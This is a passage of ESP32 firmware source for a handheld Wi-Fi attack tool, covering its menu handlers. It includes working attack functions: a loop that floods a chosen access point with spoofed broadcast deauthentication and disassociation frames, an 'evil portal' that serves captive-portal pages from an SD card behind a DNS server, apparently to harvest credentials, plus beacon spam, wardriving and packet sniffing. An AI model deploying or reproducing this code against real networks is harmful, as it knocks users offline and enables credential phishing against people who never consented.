  if (isDeauthing) {
    displayDeauthActive(deauthTargetSsid);
    uint8_t targetChannel = deauthTargetRecord.primary;
    uint8_t *apMAC = deauthTargetRecord.bssid;
    uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    wsl_bypasser_send_deauth_frame(targetChannel, broadcastMAC, apMAC, apMAC, 0xC0, 0x0007);
    wsl_bypasser_send_deauth_frame(targetChannel, broadcastMAC, apMAC, apMAC, 0xA0, 0x0007);

    wsl_bypasser_send_deauth_frame(targetChannel, apMAC, broadcastMAC, apMAC, 0xC0, 0x0007);
    wsl_bypasser_send_deauth_frame(targetChannel, apMAC, broadcastMAC, apMAC, 0xA0, 0x0007);

    buttonBack.tick();
    if (buttonBack.isClick()) {
      isDeauthing = false;
      inDeauthMenu = false;
      WiFi.scanDelete();
      wifiListUsesScanResults = false;
      WiFi.mode(WIFI_OFF);
      displayWiFiMenu(display, wifiMenuIndex);
    }

    delay(50);
    return;
  }

  int previousIndex = deauthMenuIndex;
  if (buttonUp.isClick()) {
    deauthMenuIndex = max(0, deauthMenuIndex - 1);
  }
  if (buttonDown.isClick()) {
    deauthMenuIndex = min(getStoredWiFiNetworkCount() - 1, deauthMenuIndex + 1);
  }
  drawWiFiNetworkList(deauthMenuIndex, previousIndex);

  if (buttonOK.isClick()) {
    wifi_ap_record_t *record = (wifi_ap_record_t *)WiFi.getScanInfoByIndex(deauthMenuIndex);
    if (!record) return;
    deauthTargetSsid = getDisplayedWiFiNetworkName(deauthMenuIndex);
    memcpy(&deauthTargetRecord, record, sizeof(wifi_ap_record_t));
    WiFi.scanDelete();
    wifiListUsesScanResults = false;
    init_deauth_wifi();
    isDeauthing = true;
  }

  if (buttonBack.isClick()) {
    isScanning = false;
    inDeauthMenu = false;
    WiFi.scanDelete();
    wifiListUsesScanResults = false;
    WiFi.mode(WIFI_OFF);
    displayWiFiMenu(display, wifiMenuIndex);
  }
}

void handlePacketsMenu() {
  buttonUp.tick();
  buttonDown.tick();
  buttonOK.tick();
  buttonBack.tick();

  if (isPacketScanning) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SH110X_WHITE);
    display.setCursor(3, 3);
    display.println(F("Scanning:"));
    displaySeparatorLine();
    display.setCursor(2, display.getCursorY());
    display.println(F("..."));
    display.display();

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    foundNetworks = WiFi.scanNetworks(false, true);
    if (foundNetworks > 0) {
      isPacketScanning = false;
      wifiListUsesScanResults = true;
      packetsMenuIndex = 0;
      for (int i = 0; i < min(foundNetworks, MAX_WIFI_NETWORKS); i++) {
        ssidList[i] = WiFi.SSID(i);
        wifi_ap_record_t *record = (wifi_ap_record_t *)WiFi.getScanInfoByIndex(i);
        if (record) {
          memcpy(&apRecords[i], record, sizeof(wifi_ap_record_t));
        }
      }
    } else {
      display.clearDisplay();
      display.setTextSize(1);
      display.setTextColor(SH110X_WHITE);
      display.setCursor(3, 3);
      display.print(F("No networks found"));
      display.display();
      delay(2000);
      isPacketScanning = false;
      inPacketsMenu = false;
      displayWiFiMenu(display, wifiMenuIndex);
      Serial.println(F("No networks found"));
      return;
    }
  }

  if (isPacketViewing) {
    displayPacketsGraph();
    if (buttonOK.isClick()) {
      packetsStopSniffing();
      isPacketViewing = false;
      isPacketScanning = true;
      return;
    }
    if (buttonBack.isClick()) {
      packetsStopSniffing();
      isPacketViewing = false;
      inPacketsMenu = false;
      wifiListUsesScanResults = false;
      displayWiFiMenu(display, wifiMenuIndex);
    }
    return;
  }

  int previousIndex = packetsMenuIndex;
  if (buttonUp.isClick()) {
    packetsMenuIndex = max(0, packetsMenuIndex - 1);
  }
  if (buttonDown.isClick()) {
    packetsMenuIndex = min(getStoredWiFiNetworkCount() - 1, packetsMenuIndex + 1);
  }
  drawWiFiNetworkList(packetsMenuIndex, previousIndex);

  if (buttonOK.isClick()) {
    wifi_ap_record_t *record = (wifi_ap_record_t *)WiFi.getScanInfoByIndex(packetsMenuIndex);
    if (!record) return;
    packetsChannel = record->primary;
    memset(packetsSsid, 0, sizeof(packetsSsid));
    strncpy(packetsSsid, getDisplayedWiFiNetworkName(packetsMenuIndex).c_str(), sizeof(packetsSsid) - 1);
    memcpy(packetsBssid, record->bssid, 6);
    packetsBssidSet = true;
    WiFi.scanDelete();
    wifiListUsesScanResults = false;
    packetsStartSniffing(packetsChannel);
    isPacketViewing = true;
  }

  if (buttonBack.isClick()) {
    isPacketScanning = false;
    inPacketsMenu = false;
    WiFi.scanDelete();
    wifiListUsesScanResults = false;
    WiFi.mode(WIFI_OFF);
    displayWiFiMenu(display, wifiMenuIndex);
  }
}

void handleWiFiSubmenu() {
  buttonUp.tick();
  buttonDown.tick();
  buttonOK.tick();
  buttonBack.tick();

  if (inEvilPortal) {
    if (inPortalExplorer) {
      ExplorerAction action = ExplorerHandle(
        portalExplorer,
        portalExplorerCfg,
        display,
        buttonUp.isClick(),
        buttonDown.isClick(),
        buttonOK.isClick(),
        buttonBack.isClick(),
        buttonBack.isHolded()
      );
      if (action == EXPLORER_SELECT_FILE) {
        if (loadSelectedPortal()) {
          inPortalExplorer = false;
          startEvilPortal();
        } else {
          ExplorerShowSDError(display, 1500);
          ExplorerDraw(portalExplorer, display);
        }
      } else if (action == EXPLORER_EXIT) {
        inEvilPortal = false;
        inPortalExplorer = false;
        currentMenu = 0;
        returnToMainMenu();
      }
      return;
    } else {
      server.handleClient();
      dnsServer.processNextRequest();
      displayEvilPortalScreen();
      if (buttonBack.isClick()) {
        stopEvilPortal();
        inEvilPortal = false;
        displayWiFiMenu(display, wifiMenuIndex);
      }
      return;
    }
  }

  if (inDeauthMenu) { handleDeauthSubmenu(); return; }
  if (inWardriving) { handleWardriving(); return; }
  if (inPacketsMenu) { handlePacketsMenu(); return; }

  bool upPress = buttonUp.isPress();
  bool downPress = buttonDown.isPress();
  bool okClick = buttonOK.isClick();
  bool backClick = buttonBack.isClick();
  bool inFunctionSelection = !inSpamMenu && !inEvilPortal && !inDeauthMenu && !inWardriving && !inPacketsMenu;
  static MenuButtonState upHeld;
  static MenuButtonState downHeld;

  if (inFunctionSelection) {
    upPress = isMenuButtonPress(BUTTON_UP, upHeld);
    downPress = isMenuButtonPress(BUTTON_DOWN, downHeld);
  } else {
    upHeld.wasPressed = digitalRead(BUTTON_UP) == LOW;
    downHeld.wasPressed = digitalRead(BUTTON_DOWN) == LOW;
    upHeld.nextRepeatAt = 0;
    downHeld.nextRepeatAt = 0;
  }

  if (inFunctionSelection && okClick && wifiMenuIndex == 2) {
    if (!ensureSDReadyInteractive(true)) {
      displayWiFiMenu(display, wifiMenuIndex);
      return;
    }
    inEvilPortal = true;
    inPortalExplorer = true;
    ExplorerInit(portalExplorer, portalFileList, MAX_PORTAL_FILES, portalExplorerCfg);
    loadPortalFileList();
    drawPortalExplorer();
    return;
  }

  if (inSpamMenu) {
    if (!isSpamming) displaySpamPrompt();
    else displaySpamActive();
  } else {
    displayWiFiMenu(display, wifiMenuIndex);
  }

  if (inFunctionSelection) {
    if (upPress) {
      byte previousIndex = wifiMenuIndex;
      wifiMenuIndex = (wifiMenuIndex - 1 + WIFI_MENU_ITEM_COUNT) % WIFI_MENU_ITEM_COUNT;
      displayWiFiMenu(display, wifiMenuIndex, previousIndex);
    }
    if (downPress) {
      byte previousIndex = wifiMenuIndex;
      wifiMenuIndex = (wifiMenuIndex + 1) % WIFI_MENU_ITEM_COUNT;
      displayWiFiMenu(display, wifiMenuIndex, previousIndex);
    }
  }

  if (okClick) {
    if (wifiMenuIndex == 0) {
      inDeauthMenu = true;
      isScanning = true;
      wifiListUsesScanResults = false;
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
    } else if (wifiMenuIndex == 1) {
      if (!inSpamMenu) {
        inSpamMenu = true;
        displaySpamPrompt();
      } else {
        isSpamming = !isSpamming;
        if (isSpamming) {
          clearBeaconLog();
          setupBeaconSpamWifi();
          displaySpamActive();
        } else {
          teardownBeaconSpamWifi();
          displaySpamPrompt();
        }
      }
    } else if (wifiMenuIndex == 2) {
      if (!ensureSDReadyInteractive(true)) {
        displayWiFiMenu(display, wifiMenuIndex);
        return;
      }
      inEvilPortal = true;
      inPortalExplorer = true;
      ExplorerInit(portalExplorer, portalFileList, MAX_PORTAL_FILES, portalExplorerCfg);
      loadPortalFileList();
      drawPortalExplorer();
    } else if (wifiMenuIndex == 3) {
      if (!ensureSDReadyInteractive(true)) {
        displayWiFiMenu(display, wifiMenuIndex);
        return;
      }
      inWardriving = true;
      displayWardrivingPrompt();
    } else if (wifiMenuIndex == 4) {
      inPacketsMenu = true;
      isPacketScanning = true;
      isPacketViewing = false;
      packetsBssidSet = false;
      wifiListUsesScanResults = false;
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      return;
    }
  }

  if (backClick) {
    if (inSpamMenu) {
      if (isSpamming) {
        isSpamming = false;
        teardownBeaconSpamWifi();
      }
      inSpamMenu = false;
      buttonOK.resetStates();
      buttonBack.resetStates();
      displayWiFiMenu(display, wifiMenuIndex);
      return;
    } else {
      wifiMenuIndex = 0;
      returnToMainMenu();
    }
  }

  if (isSpamming && inSpamMenu) {
    beaconSpamList(Beacons);
  }
}
